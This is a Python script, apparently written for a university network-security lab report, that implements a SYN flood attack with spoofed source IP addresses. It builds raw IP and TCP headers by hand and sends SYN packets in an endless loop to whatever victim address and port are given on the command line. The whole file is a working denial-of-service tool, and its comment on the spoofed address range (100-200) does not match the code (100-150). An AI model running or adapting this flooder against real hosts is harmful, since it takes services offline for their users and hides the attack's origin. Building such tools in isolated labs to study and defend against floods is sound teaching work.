#!/usr/bin/env python3
"""
Custom raw-socket SYN flood sender for the CSE406 design report.
Builds every IP/TCP header field ourselves with struct -- no
hping3 / Scapy / other pre-built attack tool is used.

Usage (must be run as root, e.g. inside a Mininet host, which is
already root):
    python3 attacker.py <victim_ip> [victim_port] [spoof_prefix]

Example (inside Mininet, h1 attacking h2 at 10.0.0.2):
    python3 attacker.py 10.0.0.2 80 10.0.0
"""
import socket
import struct
import random
import sys
import time


def checksum(data: bytes) -> int:
    """Standard 16-bit one's-complement checksum used by IP and TCP."""
    if len(data) % 2:
        data += b"\0"
    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        total += word
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return ~total & 0xFFFF


def build_ip_header(src_ip: str, dst_ip: str, payload_len: int) -> bytes:
    version_ihl = (4 << 4) + 5          # IPv4, header length = 5 * 4 = 20 bytes
    tos = 0
    total_len = 20 + payload_len
    ident = random.randint(0, 65535)
    flags_frag = 0
    ttl = 64
    proto = socket.IPPROTO_TCP
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    # first pass with checksum = 0, to compute the real checksum over it
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, tos, total_len, ident, flags_frag,
        ttl, proto, 0, src, dst,
    )
    ip_checksum = checksum(header)

    # second pass with the real checksum filled in
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, tos, total_len, ident, flags_frag,
        ttl, proto, ip_checksum, src, dst,
    )
    return header


def build_tcp_syn_header(src_ip: str, dst_ip: str, src_port: int, dst_port: int, seq: int) -> bytes:
    ack_seq = 0
    data_offset = (5 << 4)   # TCP header length = 5 * 4 = 20 bytes, no options
    flags = 0x02             # SYN flag only
    window = 8192            # struct.pack('!...') below already handles network byte order
    urg_ptr = 0

    # first pass with checksum = 0
    tcp_header = struct.pack(
        "!HHLLBBHHH",
        src_port, dst_port, seq, ack_seq,
        data_offset, flags, window, 0, urg_ptr,
    )

    # pseudo-header required ONLY for the checksum calculation
    # (never actually sent on the wire)
    pseudo_header = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
        0, socket.IPPROTO_TCP, len(tcp_header),
    )
    tcp_checksum = checksum(pseudo_header + tcp_header)

    # second pass with the real checksum filled in
    tcp_header = struct.pack(
        "!HHLLBBHHH",
        src_port, dst_port, seq, ack_seq,
        data_offset, flags, window, tcp_checksum, urg_ptr,
    )
    return tcp_header


def random_spoofed_ip(spoof_prefix: str) -> str:
    """
    Draw a spoofed source IP from the *same lab subnet's unused range*
    so it stays inside our isolated network and (per our design report)
    is chosen from addresses verified not to answer with RST.
    spoof_prefix example: "10.0.0" -> generates 10.0.0.<100-200>
    """
    last_octet = random.randint(100, 150)
    return f"{spoof_prefix}.{last_octet}"


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 attacker.py <victim_ip> [victim_port] [spoof_prefix]")
        sys.exit(1)

    victim_ip = sys.argv[1]
    victim_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    spoof_prefix = sys.argv[3] if len(sys.argv) > 3 else "10.0.0"

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    # IP_HDRINCL is implicit with IPPROTO_RAW -- no extra setsockopt needed

    print(f"[attacker] flooding {victim_ip}:{victim_port} ... (Ctrl+C to stop)")
    count = 0
    start = time.time()
    try:
        while True:
            src_ip = random_spoofed_ip(spoof_prefix)
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 2**32 - 1)

            tcp_hdr = build_tcp_syn_header(src_ip, victim_ip, src_port, victim_port, seq)
            ip_hdr = build_ip_header(src_ip, victim_ip, len(tcp_hdr))
            packet = ip_hdr + tcp_hdr

            s.sendto(packet, (victim_ip, 0))
            count += 1

            if count % 500 == 0:
                elapsed = time.time() - start
                rate = count / elapsed if elapsed > 0 else 0
                print(f"[attacker] sent {count} packets  ({rate:.0f} pkt/s)")
    except KeyboardInterrupt:
        elapsed = time.time() - start
        rate = count / elapsed if elapsed > 0 else 0
        print(f"\n[attacker] stopped. Sent {count} packets in {elapsed:.1f}s ({rate:.0f} pkt/s avg).")


if __name__ == "__main__":
    main()
